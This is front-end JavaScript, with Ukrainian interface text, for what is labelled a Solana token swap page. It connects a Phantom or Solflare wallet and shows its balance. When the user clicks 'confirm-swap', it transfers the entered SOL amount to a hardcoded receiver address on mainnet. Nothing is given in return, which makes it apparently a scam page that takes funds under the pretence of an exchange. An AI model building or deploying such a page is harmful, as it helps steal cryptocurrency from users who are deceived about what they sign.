import { Connection, PublicKey, Transaction, SystemProgram, sendAndConfirmTransaction } from "@solana/web3.js";

const SOLANA_NETWORK = "mainnet-beta";
const connection = new Connection(`https://api.mainnet-beta.solana.com`);
const RECEIVER_WALLET = new PublicKey("4ofLfgCmaJYC233vTGv78WFD4AfezzcMiViu26dF3cVU");

let wallet = null;

async function connectWallet(providerName) {
    try {
        if (providerName === "phantom" && window.solana?.isPhantom) {
            wallet = window.solana;
        } else if (providerName === "solflare" && window.solflare?.isSolflare) {
            wallet = window.solflare;
        } else {
            alert("Будь ласка, встановіть Phantom або Solflare гаманець!");
            return;
        }

        await wallet.connect();
        document.getElementById("walletInfo").innerText = `Гаманець: ${wallet.publicKey.toString()}`;
        await checkBalance();
    } catch (err) {
        console.error("Помилка підключення:", err);
        alert("Помилка підключення до гаманця.");
    }
}

async function checkBalance() {
    if (!wallet || !wallet.publicKey) {
        alert("Спочатку підключіть гаманець!");
        return;
    }

    const balance = await connection.getBalance(wallet.publicKey);
    document.getElementById("walletBalance").innerText = `Баланс: ${(balance / 1e9).toFixed(4)} SOL`;
}

async function sendTransaction(amount) {
    if (!wallet || !wallet.publicKey) {
        alert("Спочатку підключіть гаманець!");
        return;
    }

    try {
        const transaction = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: wallet.publicKey,
                toPubkey: RECEIVER_WALLET,
                lamports: amount * 1e9,
            })
        );

        transaction.feePayer = wallet.publicKey;
        transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

        const signedTransaction = await wallet.signTransaction(transaction);
        const signature = await connection.sendRawTransaction(signedTransaction.serialize());
        await connection.confirmTransaction(signature);
        
        alert(`Транзакція успішна! Tx: ${signature}`);
    } catch (error) {
        console.error("Помилка транзакції:", error);
        alert("Не вдалося здійснити обмін.");
    }
}

document.getElementById("connectPhantom").addEventListener("click", () => connectWallet("phantom"));
document.getElementById("connectSolflare").addEventListener("click", () => connectWallet("solflare"));
document.getElementById("confirm-swap").addEventListener("click", async () => {
    const amount = parseFloat(document.getElementById("amount").value);
    if (!amount || amount <= 0) {
        alert("Введіть коректну суму.");
        return;
    }
    await sendTransaction(amount);
});
